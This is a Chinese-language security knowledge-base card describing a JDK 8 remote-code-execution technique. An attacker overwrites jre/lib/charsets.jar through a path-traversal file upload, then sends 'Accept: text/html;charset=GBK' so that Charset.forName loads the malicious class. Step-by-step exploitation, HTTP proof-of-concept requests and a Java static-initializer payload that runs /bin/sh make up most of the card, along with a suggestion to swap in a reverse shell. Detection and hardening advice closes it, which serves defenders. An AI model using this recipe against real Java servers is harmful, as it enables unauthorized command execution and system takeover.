---
id: web-java-classloader-charsets-jar-bootstrap-overwrite-accept-gbk-rce
title: 覆盖 jre/lib/charsets.jar + Accept charset=GBK：JDK 8 字符集类加载触发命令执行
type: scenario
domain: web
path: web/java/classloader
technique: jre-charsets-jar-bootstrap-overwrite-accept-charset-rce
aliases:
- charsets.jar
- jre/lib/charsets.jar
- Accept charset GBK
- Spring Boot 上传文件 RCE
- JDK8 字符集类加载 RCE
- Charset.forName 触发
tags:
- java
- jdk8
- charsets
- bootstrap-classpath
- classloader
- spring
- arbitrary-file-write
- rce
- accept-header
cve: []
severity: high
confidence: high
status: verified
affected_versions: JDK 8（示例 1.8.0_261 / 1.8.0_161）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:46:56+08:00'
  notes: '已对照原文及截图27-32核对：rightList 读取 jdk1.8.0_261/jre 路径；uploadFile 以 relativePath 穿越上传 charsets.jar；GET / 带 Accept: text/html;charset=GBK 返回 500 且 /tmp 出现 charsets_test_3c082c79.log、d0ffd4b2.log、f6f964cf.log。JDK 8 启动类路径含 jre/lib/charsets.jar、Charset.forName 触发字符集类加载的原理成立；与既有 jre/classes+META-INF/services SPI 卡（web-java-classloader-charsetprovider-spi-accept-rce）在写入落点、触发字符集与载荷结构上不同，应保留。版本 JDK 8/示例 1.8.0_261、1.8.0_161 保留。未验证点：未复跑 PoC，载荷 JAR 由外部项目提供。'
---

## 一句话结论

在 JDK 8 中，如果能通过任意文件写入覆盖 `$JAVA_HOME/jre/lib/charsets.jar`（启动类路径上的扩展字符集 JAR），再让 Spring 应用解析 `Accept: text/html;charset=GBK`，`Charset.forName("GBK")` 就会从被替换的 JAR 加载字符集实现并执行其中的恶意代码，形成“任意文件写 → JRE 类加载 → 命令执行”。

## 原理

- **bootstrap classpath**：JDK 8 的启动类路径（`sun.boot.class.path`）包含 `jre/lib/rt.jar`、`jre/lib/charsets.jar`、`jre/lib/jce.jar`、`jre/lib/jsse.jar`、`jre/lib/resources.jar`、`jre/classes` 等；这些 JAR 由 bootstrap classloader 加载，对同 JVM 的所有应用代码可见。
- **字符集延迟加载**：JDK 8 把 GBK、GB2312、Big5 等扩展字符集实现放在 `charsets.jar` 中；`Charset.forName("GBK")` 先查缓存，未命中时通过 `CharsetProvider` 查找并加载对应字符集类，类的初始化/实例化会执行其中的代码。
- **替换 JAR**：攻击者用同名 `charsets.jar` 覆盖原文件，其中包含被修改的字符集类（或恶意 `CharsetProvider`）。当 JVM 第一次加载该字符集时，恶意代码执行。原文的载荷会在 `/tmp/` 下生成 `charsets_test_<random>.log` 作为命令执行证据。
- **触发点**：Spring MVC 解析 `Accept` 头时，`MediaType.parseMediaTypes()` 会对 `charset=` 参数调用 `Charset.forName`；请求 `GET / HTTP/1.1` 带 `Accept: text/html;charset=GBK` 即可触发。`Content-Type` 的 charset、XML 声明 encoding、`new String(bytes, charsetName)` 等也是同类触发点。
- **前置条件**：需要一条能控制目标路径的任意文件写入，把 JAR 写到 `jre/lib/` 并覆盖原文件；Web 进程必须对 JDK 安装目录有写权限。JDK 路径可通过目录列举接口确认，或按常见安装路径爆破。
- **为什么可行**：JAR 替换后，bootstrap classloader 按类名加载到攻击者的字节码；字符集类是标准 JDK 类名，应用对 `GBK` 的合法使用会自动触发，不需要额外的反序列化/表达式注入入口。
- **限制**：若 JVM 已加载过 GBK（缓存命中），本次替换不会再次触发；可选择尚未加载的其他字符集（Big5、GB2312 等）或等待重启；JDK 9+ 模块化后启动类路径机制变化，`jre/lib/charsets.jar` 不再以同样方式生效。

## 触发条件

- 目标运行 JDK 8（示例 `1.8.0_261`、`1.8.0_161`），且 `jre/lib/charsets.jar` 位于启动类路径。
- 攻击者拥有任意文件写入能力，且能覆盖 `$JAVA_HOME/jre/lib/charsets.jar`（进程对 JDK 目录可写）。
- 应用使用 Spring MVC（或其他会解析 `Accept`/`Content-Type` charset 的框架），且目标字符集尚未被 JVM 加载。
- 攻击者知道或能爆破 JDK 安装路径；目标路径所在文件系统可写、非只读容器。
- 上传/写入接口允许任意后缀与内容（如模板上传的 `relativePath` 穿越）。

## 利用步骤

1. 通过后台信息接口/目录列举获取 `osName`、`jdkVersion` 与 JDK 安装路径；常见路径如 `/usr/local/java/jdk1.8.0_261/jre/lib/`、`/usr/lib/jvm/jdk1.8/jre/lib/`。
2. 准备恶意 `charsets.jar`（替换 JDK 原字符集 JAR；载荷可在字符集类初始化时执行命令，并写 `/tmp/charsets_test_<random>.log` 验证）。
3. 用任意文件写入接口把 JAR 上传到 `$JAVA_HOME/jre/lib/`，文件名必须为 `charsets.jar` 以覆盖原文件；可用 `rightList` 目录列举确认写入成功。
4. 向任意会解析 `Accept` 的接口发送 `Accept: text/html;charset=GBK`，触发 `Charset.forName("GBK")`。
5. 检查 `/tmp/charsets_test_*.log` 是否出现；若未触发，换一个尚未加载的字符集（GB2312、Big5、UTF-32 等）重试，或等待应用重启。
6. 把验证命令替换为反弹 Shell/落地文件/读取配置等，完成 RCE。

## PoC

```http
POST /server-admin/template/uploadFile HTTP/1.1
Host: target
Token: <admin JWT>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="relativePath"

../../../../../../../../../../../usr/local/java/jdk1.8.0_261/jre/lib/
------X
Content-Disposition: form-data; name="uploadFile"; filename="charsets.jar"
Content-Type: image/jpeg

<恶意 charsets.jar 字节>
------X--
```

```http
GET / HTTP/1.1
Host: target
Accept: text/html;charset=GBK
```

```text
# 触发成功后目标 /tmp 出现：
# charsets_test_3c082c79.log
# charsets_test_d0ffd4b2.log
# charsets_test_f6f964cf.log
```

载荷结构示意（实际 JAR 需按目标 JDK 的字符集类结构编译/打包）：

```java
// 覆盖 charsets.jar 中的字符集实现类，在类初始化时执行命令
static {
    try {
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
            "id > /tmp/charsets_test_" + System.nanoTime() + ".log"});
    } catch (Exception ignored) {}
}
```

## 变体与关联

- **写入位置变体**：`jre/lib/ext/` 放恶意 JAR（扩展类加载器）、`jre/classes` 放 class + `META-INF/services`（bootstrap 类路径）、应用 `WEB-INF/lib`、classpath 目录；不同位置对重启/可见性要求不同。
- **触发点变体**：`Content-Type: application/json;charset=GBK`、XML 声明 `encoding="GBK"`、模板/编码转换、`new String(bytes, "GBK")`、`Charset.forName` 的其他调用点。
- **字符集变体**：GBK 已被加载时改用 GB2312、Big5、UTF-32、ISO-2022-CN 等；也可用自定义字符集名触发 `CharsetProvider`。
- **关联**：[[web-java-classloader-charsetprovider-spi-accept-rce]]（`jre/classes` + 自定义字符集名的 SPI 注入变体）、[[web-generic-file-upload-template-relative-path-original-filename-arbitrary-write]]（本文的前置任意文件写）、[[web-generic-file-upload-zip-slip-webshell-write]]（另一条任意写入路径）。
- **边界**：JDK 9+ 模块化、只读 JDK 目录、JVM 已缓存目标字符集、容器只读根文件系统都会导致失败。

## 检测与防御

- **检测**：`jre/lib/charsets.jar` 的哈希/大小/修改时间变化；JDK 安装目录被 Web 进程写入；`/tmp` 出现 `charsets_test_*.log` 等异常文件；JVM 派生 `sh`/`bash` 子进程；请求 `Accept`/`Content-Type` 的 charset 值异常（但 `GBK` 在中文环境常见，需结合文件完整性告警）。
- **修复**：上传/写入路径做规范化与根目录校验，禁止覆盖 JDK/系统目录；上传文件由服务端生成文件名并限制后缀/内容。
- **加固**：Web 进程降权，JDK 目录只读；文件完整性监控（AIDE/OSSEC/容器镜像校验）；升级到 JDK 9+ 并限制启动类路径可写性；对 `Charset.forName` 的输入做白名单。
- **审计**：检查 `getOriginalFilename()`、`relativePath`、`new File(` 等文件写入 sink；确认应用是否把用户可控值传给 `Charset.forName`。
